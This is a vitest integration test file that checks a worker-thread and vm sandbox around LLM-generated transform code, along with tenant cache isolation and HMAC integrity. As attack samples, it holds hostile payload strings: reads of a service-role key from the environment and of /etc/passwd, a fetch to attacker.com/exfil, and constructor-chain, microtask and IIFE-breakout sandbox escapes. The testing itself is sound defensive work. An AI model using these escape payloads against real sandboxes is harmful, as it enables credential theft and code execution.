/**
 * WKH-60 / SEC-RCE-1 — integration tests for the hardened transform service.
 *
 * 15 tests T-VER-RCE-1..15 covering:
 *   T-VER-RCE-1   process bypass throws (RCE blocked)
 *   T-VER-RCE-2   require bypass throws
 *   T-VER-RCE-3   fetch bypass throws (no SSRF from sandbox)
 *   T-VER-RCE-4   eval bypass throws (codeGeneration.strings = false)
 *   T-VER-RCE-5   new Function bypass throws (codeGeneration.strings = false)
 *   T-VER-RCE-6   infinite loop in transform body fires TransformTimeoutError
 *   T-VER-RCE-7   ownerId === undefined → never-cache (no L2 read, no upsert)
 *   T-VER-RCE-8   different ownerIds → independent L1 entries (cross-tenant miss)
 *   T-VER-RCE-9   same ownerId twice → L1 hit on second call
 *   T-VER-RCE-10  HMAC enabled + tampered transform_fn → cache miss + LLM regen
 *   T-VER-RCE-11  HMAC enabled + missing sig column → cache miss + warn
 *   T-VER-RCE-12  HMAC enabled + valid sig → cache hit
 *   T-VER-RCE-13  host-realm prototype escape (output.constructor.constructor) blocked
 *   T-VER-RCE-14  microtask escape (Promise.then) does NOT mutate parent state
 *                 after the worker returns
 *   T-VER-RCE-15  IIFE wrapper breakout (})(output); ATTACK; (function(o){) blocked
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('../../../lib/supabase.js', () => {
  const mockFrom = vi.fn();
  return { supabase: { from: mockFrom } };
});

const mockCreate = vi.fn();
vi.mock('@anthropic-ai/sdk', () => ({
  // biome-ignore lint/complexity/useArrowFunction: must use function() for new-able mock constructor
  default: vi.fn().mockImplementation(function () {
    return { messages: { create: mockCreate } };
  }),
}));

import { supabase } from '../../../lib/supabase.js';
import { _clearL1Cache, _resetHmacWarn, maybeTransform } from '../transform.js';
import { signTransformFn } from '../transform-hmac.js';

const HMAC_KEY = 'test-hmac-key-32bytes-aaaaaaaaaaaaaaaa';

// Configures Anthropic mock to return a transform body. Works for the
// "happy" path: input and output match the schema after one shot.
function setupLLMResponse(transformFn: string): void {
  mockCreate.mockResolvedValue({
    content: [{ type: 'text', text: JSON.stringify({ transformFn }) }],
    usage: { input_tokens: 100, output_tokens: 50 },
  });
}

// Configures Supabase to behave as a "miss" (PostgREST 404). Returns the
// upsert spy so tests can verify it was / was not called.
function setupSupabaseMiss(): {
  upsert: ReturnType<typeof vi.fn>;
  eq4: ReturnType<typeof vi.fn>;
} {
  const single = vi.fn().mockResolvedValue({
    data: null,
    error: {
      message: 'not found',
      details: '',
      hint: '',
      code: '404',
      name: 'PostgrestError',
    },
  });
  const eq4 = vi.fn().mockReturnValue({ single });
  const eq3 = vi.fn().mockReturnValue({ eq: eq4, single });
  const eq2 = vi.fn().mockReturnValue({ eq: eq3, single });
  const eq1 = vi.fn().mockReturnValue({ eq: eq2, single });
  const select = vi.fn().mockReturnValue({ eq: eq1 });
  const updateEqChain = vi.fn().mockReturnThis();
  const update = vi.fn().mockReturnValue({ eq: updateEqChain });
  const upsert = vi.fn().mockResolvedValue({ error: null });
  vi.mocked(supabase.from).mockReturnValue({
    select,
    update,
    upsert,
  } as unknown as ReturnType<typeof supabase.from>);
  return { upsert, eq4 };
}

// Configures Supabase to behave as a "hit". The row carries `transform_fn`
// + `transform_fn_sig` (caller decides what value to plant).
function setupSupabaseHit(transformFn: string, sig: string | null): void {
  const single = vi.fn().mockResolvedValue({
    data: {
      transform_fn: transformFn,
      transform_fn_sig: sig,
      hit_count: 0,
    },
    error: null,
    count: null,
    status: 200,
    statusText: 'OK',
  });
  const eq4 = vi.fn().mockReturnValue({ single });
  const eq3 = vi.fn().mockReturnValue({ eq: eq4, single });
  const eq2 = vi.fn().mockReturnValue({ eq: eq3, single });
  const eq1 = vi.fn().mockReturnValue({ eq: eq2, single });
  const select = vi.fn().mockReturnValue({ eq: eq1 });
  const updateEqChain = vi.fn().mockReturnThis();
  const update = vi.fn().mockReturnValue({ eq: updateEqChain });
  const upsert = vi.fn().mockResolvedValue({ error: null });
  vi.mocked(supabase.from).mockReturnValue({
    select,
    update,
    upsert,
  } as unknown as ReturnType<typeof supabase.from>);
}

beforeEach(() => {
  vi.clearAllMocks();
  _clearL1Cache();
  _resetHmacWarn();
  process.env.ANTHROPIC_API_KEY = 'test-key';
  delete process.env.SCHEMA_TRANSFORM_HMAC_KEY;
});

afterEach(() => {
  delete process.env.SCHEMA_TRANSFORM_HMAC_KEY;
});

// ──────────────────────────────────────────────────────────────
// RCE blocking — sandbox guarantees the LLM-generated code can't reach
// real globals. Each test plants a malicious body that, if executed in
// the parent realm, would either exfiltrate or pivot to RCE. The
// applyTransformFn step must throw, surfacing as "Step N failed" at the
// compose layer (the throw bubbles up through maybeTransform).
// ──────────────────────────────────────────────────────────────

describe('WKH-60 RCE blocking — sandbox', () => {
  it('T-VER-RCE-1: malicious process.env.read in transformFn throws', async () => {
    setupLLMResponse('return process.env.SUPABASE_SERVICE_ROLE_KEY;');
    const { upsert } = setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();

    // Important: a body that throws must NOT be persisted to L2 (the LLM
    // path only persists when isCompatible(transformed1, schema) is true).
    expect(upsert).not.toHaveBeenCalled();
  });

  it('T-VER-RCE-2: malicious require("node:fs") in transformFn throws', async () => {
    setupLLMResponse(
      'return require("node:fs").readFileSync("/etc/passwd","utf8");',
    );
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });

  it('T-VER-RCE-3: malicious fetch() to attacker.com throws', async () => {
    setupLLMResponse('return fetch("http://attacker.com/exfil");');
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });

  it('T-VER-RCE-4: eval() in transformFn throws (codeGeneration.strings=false)', async () => {
    setupLLMResponse('return eval("1+1");');
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });

  it('T-VER-RCE-5: new Function() in transformFn throws', async () => {
    setupLLMResponse('return new Function("return 1")();');
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });

  it('T-VER-RCE-6: infinite loop in transformFn fires TransformTimeoutError', async () => {
    setupLLMResponse('while(true){} return 0;');
    setupSupabaseMiss();

    // The error class is exported via transform.ts; we match by name +
    // message rather than instanceof to keep the import surface minimal.
    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow(/timed out/i);
  }, 10_000);

  // ──────────────────────────────────────────────────────────────
  // Post-AR hardening — node:vm alone is not a security boundary.
  // Three escape classes were verified pre-fix and are now closed by the
  // worker_threads + vm-context-internal-JSON.parse pattern documented in
  // src/services/llm/vm-runner.ts. See doc/sdd/062-wkh-60-sec-rce-1/
  // auto-blindaje.md for the repro that confirmed each escape.
  // ──────────────────────────────────────────────────────────────

  // T-VER-RCE-13 — Host-realm prototype-chain escape.
  // Pre-fix: output.constructor.constructor reached the calling realm's
  // Function constructor and exfiltrated process.env.
  // Post-fix: output is JSON.parse'd INSIDE the vm context, so its
  // constructor chain belongs to the vm realm where Function() is gated
  // by codeGeneration.strings = false.
  it('T-VER-RCE-13: output.constructor.constructor escape is blocked', async () => {
    setupLLMResponse(
      'return output.constructor.constructor("return process.env.SUPABASE_SERVICE_ROLE_KEY")();',
    );
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });

  // T-VER-RCE-14 — Microtask escape.
  // Pre-fix: Promise.resolve().then(exfil) scheduled a callback on the
  // calling realm's microtask queue; the callback fired AFTER
  // runInContext returned (vm `timeout` only kills sync CPU), mutating
  // shared state post-hoc.
  // Post-fix: each call runs in a worker_threads Worker; worker.terminate()
  // kills the thread including every pending microtask, timer, and
  // Promise callback. Because the input is JSON-cloned twice (parent →
  // workerData → JSON.parse-inside-vm), the body has no reference to the
  // parent's object even if it could schedule a microtask.
  //
  // We assert two things: (1) the call itself returns successfully (the
  // body's `return 1` runs synchronously before the microtask fires), and
  // (2) after a generous wait window, no setter on the parent's object
  // was triggered.
  it('T-VER-RCE-14: microtasks scheduled by transformFn cannot mutate parent state', async () => {
    let microtaskFired = false;
    const sharedOutput: Record<string, unknown> = {
      x: 1,
    };
    Object.defineProperty(sharedOutput, 'leak', {
      enumerable: true,
      configurable: true,
      get(): number {
        return 0;
      },
      set(_v: unknown): void {
        microtaskFired = true;
      },
    });

    setupLLMResponse(
      'Promise.resolve().then(() => { output.leak = 1; }); return { k: "ok" };',
    );
    setupSupabaseMiss();

    const result = await maybeTransform(
      'src',
      'tgt',
      sharedOutput,
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );

    // Body's synchronous return reached the parent.
    expect(result.transformedOutput).toEqual({ k: 'ok' });

    // Wait long enough for any leaked microtask to fire.
    await new Promise((r) => setTimeout(r, 200));

    // The setter on the parent's `leak` property MUST NOT have been
    // invoked. The body received a JSON-cloned copy, and the worker is
    // terminated before any microtask in the worker realm could even
    // try to mutate it.
    expect(microtaskFired).toBe(false);
  });

  // T-VER-RCE-15 — IIFE wrapper breakout.
  // Pre-fix: a body of the form `})(output); ATTACK; (function(o){`
  // closed the IIFE wrapper, ran `ATTACK` in outer-script scope (still
  // vm but with the host-realm prototype-chain issue from #1), and
  // re-opened an empty IIFE so the wrapper template parsed.
  // Post-fix: even if the breakout-style body parses, ATTACK runs in
  // the vm context where Function (via constructor.constructor) is
  // gated by codeGeneration.strings = false, so any exfiltration
  // attempt throws "Code generation from strings disallowed".
  it('T-VER-RCE-15: IIFE wrapper breakout cannot escape the sandbox', async () => {
    // Closes the wrapper, tries to invoke Function via constructor chain,
    // re-opens an empty IIFE so the wrapper-suffix `})(output)` still
    // parses. This compiles successfully (no SyntaxError) but the
    // ATTACK expression must throw at runtime.
    setupLLMResponse(
      '})(output); ATTACK = output.constructor.constructor("return process.env.SUPABASE_SERVICE_ROLE_KEY")(); (function(o){ return ATTACK;',
    );
    setupSupabaseMiss();

    await expect(
      maybeTransform(
        'src',
        'tgt',
        { x: 1 },
        { required: ['k'], properties: { k: { type: 'string' } } },
        'tenant-1',
      ),
    ).rejects.toThrow();
  });
});

// ──────────────────────────────────────────────────────────────
// Ownership scoping — L2 read/write must be filtered by owner_ref so that
// two tenants with the same (source, target, schema) never share a cache
// entry.
// ──────────────────────────────────────────────────────────────

describe('WKH-60 ownership scoping', () => {
  it('T-VER-RCE-7: ownerId === undefined → never-cache (no L2 read, no upsert)', async () => {
    setupLLMResponse('return { k: output.x };');
    const { upsert } = setupSupabaseMiss();

    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'v' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      // No ownerId
    );

    expect(result.bridgeType).toBe('LLM');
    // never-cache mode → from() must NOT have been called (no select for L2,
    // no upsert). The LLM path is hit but no Supabase persistence happens.
    expect(supabase.from).not.toHaveBeenCalled();
    expect(upsert).not.toHaveBeenCalled();
  });

  it('T-VER-RCE-8: different ownerIds get independent L1 entries (cross-tenant miss)', async () => {
    setupLLMResponse('return { k: output.x };');
    setupSupabaseMiss();

    // First call: tenant-1 populates L1[tenant-1]
    await maybeTransform(
      'src',
      'tgt',
      { x: 'a' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );

    // Second call: tenant-2 SAME (src,tgt,schema). Must NOT reuse tenant-1's
    // L1 entry — must hit the LLM again.
    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'b' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-2',
    );

    expect(mockCreate).toHaveBeenCalledTimes(2);
    expect(result.bridgeType).toBe('LLM'); // second tenant: cache miss
  });

  it('T-VER-RCE-9: same ownerId twice → L1 hit on second call', async () => {
    setupLLMResponse('return { k: output.x };');
    setupSupabaseMiss();

    // Call 1 — populates L1
    await maybeTransform(
      'src',
      'tgt',
      { x: 'a' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );
    expect(mockCreate).toHaveBeenCalledTimes(1);

    // Call 2 — L1 hit, no LLM
    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'b' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );

    expect(mockCreate).toHaveBeenCalledTimes(1); // unchanged
    expect(result.bridgeType).toBe('CACHE_L1');
  });
});

// ──────────────────────────────────────────────────────────────
// HMAC integrity — when SCHEMA_TRANSFORM_HMAC_KEY is set, L2 rows that
// don't carry a verifiable signature are rejected.
// ──────────────────────────────────────────────────────────────

describe('WKH-60 HMAC integrity', () => {
  it('T-VER-RCE-10: tampered transform_fn fails verify → cache miss + LLM regen', async () => {
    process.env.SCHEMA_TRANSFORM_HMAC_KEY = HMAC_KEY;

    const legitFn = 'return { k: output.x };';
    const goodSig = signTransformFn(legitFn, HMAC_KEY);
    // Plant a row whose body was swapped but whose signature is for the
    // legitimate fn — verify must fail.
    const tamperedFn = 'return { k: "EXFIL-" + JSON.stringify(output) };';
    setupSupabaseHit(tamperedFn, goodSig);

    // The miss → LLM path needs to be ready in case verify fails.
    setupLLMResponse(legitFn);
    // Re-arm Supabase to "miss" so the second from() call (LLM persist)
    // doesn't crash. We re-use the same chain for upsert.
    // Actually — setupSupabaseHit replaced the mock. Tests rely on the
    // upsert resolving. setupSupabaseHit returns an upsert that resolves
    // {error: null}, which is fine here.

    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'a' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );
    warnSpy.mockRestore();

    // Verify failed → fallback to LLM, NOT served from cache.
    expect(result.bridgeType).toBe('LLM');
    expect(result.transformedOutput).toEqual({ k: 'a' });
    expect(mockCreate).toHaveBeenCalledTimes(1);
  });

  it('T-VER-RCE-11: HMAC enabled + row has NULL sig → cache miss + warn', async () => {
    process.env.SCHEMA_TRANSFORM_HMAC_KEY = HMAC_KEY;

    setupSupabaseHit('return { k: output.x };', null); // no sig
    setupLLMResponse('return { k: output.x };');

    const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'a' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );

    // Cache miss → LLM ran.
    expect(result.bridgeType).toBe('LLM');
    expect(mockCreate).toHaveBeenCalledTimes(1);

    // The warn must mention "missing transform_fn_sig".
    const warns = warnSpy.mock.calls.map((c) => c.join(' '));
    expect(warns.some((w) => /missing transform_fn_sig/i.test(w))).toBe(true);
    warnSpy.mockRestore();
  });

  it('T-VER-RCE-12: HMAC enabled + valid sig → cache hit', async () => {
    process.env.SCHEMA_TRANSFORM_HMAC_KEY = HMAC_KEY;

    const legitFn = 'return { k: output.x };';
    const goodSig = signTransformFn(legitFn, HMAC_KEY);
    setupSupabaseHit(legitFn, goodSig);

    const result = await maybeTransform(
      'src',
      'tgt',
      { x: 'a' },
      { required: ['k'], properties: { k: { type: 'string' } } },
      'tenant-1',
    );

    expect(result.bridgeType).toBe('CACHE_L2');
    expect(result.transformedOutput).toEqual({ k: 'a' });
    expect(mockCreate).not.toHaveBeenCalled();
  });
});
